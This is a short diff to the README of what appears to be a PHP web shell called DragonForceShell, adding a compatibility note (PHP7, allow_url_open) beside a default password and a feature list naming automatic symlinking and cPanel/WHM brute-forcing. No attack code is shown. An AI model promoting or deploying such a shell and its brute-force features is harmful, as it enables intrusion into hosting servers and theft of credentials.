@@ -4,6 +4,10 @@ Initial release of DragonForceShell(DFS) Version 1.0<br>
 Password: DF_Malaysia@1337$
 <br>
 
+# DFSV1 Compatibility
+PHP7 and above<br>
+Enabled allow_url_open
+
 # Features
 Auto Symlink<br>
 Cpanel/WHM Bruteforce<br>
